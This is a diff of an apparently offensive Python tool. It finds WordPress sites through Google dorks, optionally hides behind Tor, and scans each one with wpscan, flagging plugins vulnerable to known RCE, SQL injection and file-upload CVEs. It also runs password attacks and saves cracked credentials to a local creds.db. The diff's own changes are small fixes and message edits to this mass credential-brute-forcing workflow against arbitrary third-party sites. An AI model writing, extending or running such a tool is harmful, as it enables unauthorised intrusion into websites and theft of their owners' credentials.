@@ -30,39 +30,38 @@ def checkvuln(pathfile):
                 print(colored("\t > Found WordPress " + obj_data['version']['number'] + " vulnerable to RCE (CVE-2016-10033)", 'magenta'))
 
             # JOOMSPORT
-            if 'joomsport' in str(obj_data):
+            if 'joomsport' in str(obj_data) and obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']:
                 # Check for vulnerability version in JoomSport 3.3 - SQL INJECTION
                 if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
                     print(colored("\t > Found JoomSport " + obj_data['plugins']['joomsport-sports-league-results-management']['version']['number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
 
             # SOCIAL WARFARE
-            if 'Social Warfare' in str(obj_data):
+            if 'Social Warfare' in str(obj_data) and obj_data['plugins']['social-warfare']['version']['number']:
                 # Check for vulnerability version in Social Warfare Plugin < 3.5.3 - RCE
                 if str(obj_data['plugins']['social-warfare']['version']['number']) < '3.5.3':
                     print(colored("\t > Found Social Warfare " + obj_data['plugins']['social-warfare']['version']['number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
 
             # CONTACT FORM 7
-            if 'contact-form-7' in str(obj_data):
+            if 'contact-form-7' in str(obj_data) and obj_data['plugins']['contact-form-7']['version']['number']:
                 # Check for vulnerability version in Contact Form 7 - Unrestricted File Upload
                 if str(obj_data['plugins']['contact-form-7']['version']['number']) < '5.3.2':
-                    print(colored("\t > Found Contact Form 7 " + obj_data['plugins']['contact-form-7']['version']['number'] + " vulnerable to Unrestricted File Upload (CVE-2020-35489)", 'magenta'))
+                    print(colored("\t > Found Contact Form " + obj_data['plugins']['contact-form-7']['version']['number'] + " vulnerable to Unrestricted File Upload (CVE-2020-35489)", 'magenta'))
 
             # YOAST SEO
-            if 'wordpress-seo' in str(obj_data):
+            if 'wordpress-seo' in str(obj_data) and obj_data['plugins']['wordpress-seo']['version']['number']:
                 # Check for vulnerability version in Yoast SEO - Blind SQL Injection
                 if str(obj_data['plugins']['wordpress-seo']['version']['number']) == '1.7.3.3':
                     print(colored("\t > Found Yoast SEO " + obj_data['plugins']['wordpress-seo']['version']['number'] + " vulnerable to Blind SQL Injection (CVE-2015-2292)", 'magenta'))
 
-
         # Check for some errors, timeouts, waf and so on..
         elif 'WAF' in str(obj_data):
-            print(colored("\t WAF Detected!", 'red'))
+            print(colored("\t > WAF Detected!", 'red'))
         elif 'Timeout was reached' in str(obj_data):
-            print(colored("\t Timeout Reached!", 'red'))
+            print(colored("\t > Timeout Reached!", 'red'))
         elif 'scan_aborted' in str(obj_data):
-            print(colored("\t Aborted due to some redirect or website not running Wordpress!", 'red'))
+            print(colored("\t > Aborted due to some redirect or website not running Wordpress!", 'red'))
         else:
-            print(colored("\t Aborted for unrecognized error!", 'red'))
+            print(colored("\t > Aborted for unrecognized error!", 'red'))
 
 def showdorks():
     """Show Wordpress google dorks available and returns choosen"""
@@ -169,6 +168,7 @@ def savecreds(pathfile, url):
     try:
         connection = sqlite3.connect(dbfile)
         cursor = connection.cursor()
+
         # Reading JSON from file - a nested dict -
         with open(pathfile) as json_file:
             obj_data = json.load(json_file)
@@ -177,11 +177,11 @@ def savecreds(pathfile, url):
                 for username in obj_data['password_attack']:
                     # username var will be empty if no creds found so insert will not be triggered
                     if username:
-                        print(colored("\t > Pw3ned! (check creds.db) " + url, 'magenta'))
+                        print(colored("\t > Pw3ned - Valid Credentials Found!", 'magenta'))
                         # Write credentials to db
                         cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
                         connection.commit()
-                        credsfound = True
+
         cursor.close()
     except sqlite3.Error:
         print(colored(" Error while connecting to database! Creds NOT saved!", 'red'))
@@ -218,7 +218,7 @@ def googledork(dork, amount, wordlist, usetor):
     for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=8):
         parsed_uri = urlparse(result)
         wordpress = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
-        # wordpress = "http://192.168.1.29/wordpress/"
+        #wordpress = "http://192.168.1.33/wordpress/"
 
         # Create filename
         filename = parsed_uri.netloc + ".json".strip('\n')
@@ -227,7 +227,8 @@ def googledork(dork, amount, wordlist, usetor):
         if Path(pathfile).is_file():
             # File exist already so skip this host and not increment requ var
             print(colored(" - Skipping " + wordpress + " (already scanned)", 'green'))
-            time.sleep(0.1)
+            # Sleep to avoid a ban from google
+            time.sleep(4)
             continue
 
         print(colored(" + Scanning " + wordpress, 'green'))
@@ -255,8 +256,6 @@ def main():
 
     global dbfile
     dbfile = "creds.db"
-    global credsfound
-    credsfound = False
 
     # Check if wpscan is installed
     rc = subprocess.call(['which', 'wpscan'], stdout=subprocess.PIPE)
@@ -349,11 +348,7 @@ def main():
         print(colored(" Killing TOR pid..", 'red'))
         os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
 
-    if credsfound:
-        print(colored(" Completed - Passwords Found!", 'magenta'))
-    else:
-        print(colored(" Completed - Passwords Not Found!", 'red'))
-    exit(0)
+    print(colored(" Completed", 'magenta'))
 
 
 if __name__ == '__main__':
